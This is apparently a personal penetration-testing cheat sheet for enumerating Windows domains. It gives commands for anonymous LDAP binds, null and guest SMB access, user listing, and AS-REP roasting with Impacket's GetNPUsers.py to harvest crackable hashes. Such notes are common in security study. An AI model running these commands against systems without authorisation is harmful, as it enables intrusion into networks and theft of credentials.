# Windows technologies
How to enumerate windows tech

# LDAP
## Look for anonymous binds
`ldapsearch -H ldap://<ip>:<port> -b "dc=domain,dc=local" -x`    
**Make sure to look for users in the Remote Management Users group**    

## Get users with
`./windapsearch.py --dc-ip <ip> -d domain.local -u "" -U`
​
# SMB
## enum4linux
enum4linux is used to enumerate info on Samba systems

`enum4linux -U -o <ip>`

## smbpasswd
If crackmapexec gives the following error: **STATUS_PASSWORD_MUST_CHANGE**    
Shortcut:
`echo -e "oldpasswd\nnewpasswd\nnewpasswd" | (smbpasswd -U uname -r <ip>)`
​
## Check for guest or null access
*(Try each command separately)*
```sh
enum4linux -a -u "" -p "" <ip> && enum4linux -a -u "guest" -p "" <ip>

smbmap -u "" -p "" -P 445 -H <ip> && smbmap -u "guest" -p "" -P 445 -H <ip>

smbclient -U '%' -L //<ip> && smbclient -U 'guest%' -L //
```

# Kerberos
## GetNPUsers.py
Impacket's `GetNPUsers.py` will attempt to harvest the non-preauth AS_REP responses for a given list of usernames

### Usage:
`python3 GetNPUsers.py test.local/ -dc-ip <ip> -usersfile usernames.txt -format hashcat -outputfile hashes`


# Tools for all tech
## crackmapexec
This allows you to enumerate Active Directory environments.